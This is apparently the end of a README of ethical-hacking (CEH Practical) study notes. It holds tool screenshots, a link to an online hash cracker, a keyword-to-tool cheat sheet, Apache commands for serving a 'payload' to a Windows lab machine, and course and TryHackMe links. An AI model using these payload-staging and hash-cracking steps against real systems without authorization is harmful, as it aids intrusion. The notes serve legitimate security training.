  <img src = "/IMG/MD5 Calc/MD5Calc4.png"/>  
  
</details>

<details>
    <summary>VeraCrypt</summary>
      
  ## VeraCrypt 

  
  <img src = "/IMG/VeraCrypt/VC1.png"/>
  <img src = "/IMG/VeraCrypt/VC2.png"/>
  <img src = "/IMG/VeraCrypt/VC3.png"/>
  <img src = "/IMG/VeraCrypt/VC4.png"/>
  <img src = "/IMG/VeraCrypt/VC5.png"/>
  <img src = "/IMG/VeraCrypt/VC6.png"/>
  <img src = "/IMG/VeraCrypt/VC7.png"/>
  <img src = "/IMG/VeraCrypt/VC8.png"/>
  <img src = "/IMG/VeraCrypt/VC9.png"/>
  <img src = "/IMG/VeraCrypt/VC10.png"/>
  <img src = "/IMG/VeraCrypt/VC11.png"/>
  <img src = "/IMG/VeraCrypt/VC12.png"/>
  <img src = "/IMG/VeraCrypt/VC13.png"/>
  <img src = "/IMG/VeraCrypt/VC14.png"/>
  <img src = "/IMG/VeraCrypt/VC15.png"/>
  <img src = "/IMG/VeraCrypt/VC16.png"/>
  <img src = "/IMG/VeraCrypt/VC17.png"/>
  <img src = "/IMG/VeraCrypt/VC18.png"/>
  
</details> 

<details>
    <summary>BCTextEncoded</summary>
  
  ## BCTextEncoded
    
  <img src = "/IMG/BCTextEncoded/BCTE1.png"/>
    
  <img src = "/IMG/BCTextEncoded/BCTE2.png"/>
    
  <img src = "/IMG/BCTextEncoded/BCTE3.png"/>
    
  <img src = "/IMG/BCTextEncoded/BCTE4.png"/>
    
  <img src = "/IMG/BCTextEncoded/BCTE5.png"/>

  <img src = "/IMG/BCTextEncoded/BCTE6.png"/>


</details>
<details>
  <summary>online hash Links</summary>
  
## hash.com Link
* [hash.com](https://hashes.com/en/decrypt/hash) is a online hash Identifier and Cracker 
</details>

<details>
    <summary>Keywords</summary>
  
  ## Keywords
  
  
  * Img hidden      - Openstego
  * .hex            - Cryptool
  * Whitespace      - SNOW
  * MD5             - Hashcalc & MD5 Calculator
  * Encoded         - BCTexteditor
  * Volume & mount  - Veracrypt

</details>

# File Transfer
<details>
  <summary>File Transfer</summary>
  
## File Transfer

### Linux to Windows
* used to send a payload by Apache 
```console
mkdir /var/www/html/share
chmod -R 755 /var/www/html/share
chown -R www-data:www-data /var/www/html/share
cp /root/Desktop/filename /var/www/html/share/
  ```
  * to start and verify
  ```console
  service apache2 start 
  service apache2 status
  ```
  * to Download from Windows
  * Open browser 
  ```shell
  IP_OF_LINUX/share
  ```
### Windows to Linux 
* File system > Network > smb///IP_OF_WINDOWS
</details>


# Resource
<details>
  <summary>Course</summary>

  ## Course
  
* [Penetration Testing Student - PTS ](https://my.ine.com/CyberSecurity/learning-paths/a223968e-3a74-45ed-884d-2d16760b8bbd/penetration-testing-student) from [INE](https://my.ine.com/)
* [Practical Ethical Hacking - PEH ](https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course) from [TCM Security](https://tcm-sec.com/)
* [iLab](https://ilabs.eccouncil.org/ethical-hacking-exercises/) CEH (Practical) Official Lab from [EC-Council](https://www.eccouncil.org/)
* [Youtube free iLab ](https://www.youtube.com/watch?v=9g5gdhoDotg&list=PLWGnVet-gN_kGHSHbWbeI0gtfYx3PnDZO)

</details>
<details>
  <summary>TryHackMe</summary>

## TryHackMe
### Learning Path
* [Pre-Security](https://tryhackme.com/paths) 
* [Jr Penetration Tester](https://tryhackme.com/paths)
* [Complete Beginner](https://tryhackme.com/paths) 
### Rooms
* [Linux](https://tryhackme.com/module/linux-fundamentals)
* [Nmap](https://tryhackme.com/room/furthernmap)
* [SQLMAP](https://tryhackme.com/room/sqlmap)
* [hark](https://tryhackme.com/room/wireshark)
* [Hydra](https://tryhackme.com/room/hydra)
* [DVWA](https://tryhackme.com/room/dvwa)
* [OWASP Top 10](https://tryhackme.com/room/owasptop10)

  
</details>  






